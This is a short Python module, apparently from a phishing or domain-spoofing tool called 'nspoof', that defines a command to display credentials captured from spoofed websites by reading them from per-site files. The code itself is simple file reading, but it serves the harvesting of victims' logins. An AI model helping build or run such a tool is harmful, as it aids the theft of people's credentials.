import sys
import os
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))
from environment import *
from tabulate import tabulate
from termcolor import colored
from commands.list_command import list_command

def show_creds_command(params):

    if len(params) == 0:
        print("Precise website id :")
        list_command([])
        return

    if len(params) != 1:
        print("Usage error. Type help.")
        return

    index = int(params[0]) - 1

    if 0 <= index < len(WEBSITES):

        print("Catched credentials from domain(s) " + colored(WEBSITES[index][1], "cyan"))

        file_path = os.path.join(ENV['nspoof_location'] + "/credentials", f"{index+1}")

        with open(file_path, 'r', encoding='utf-8') as file:
            content = file.read()
            print(content)

    else:
        print("Error. Website does not exist")
        return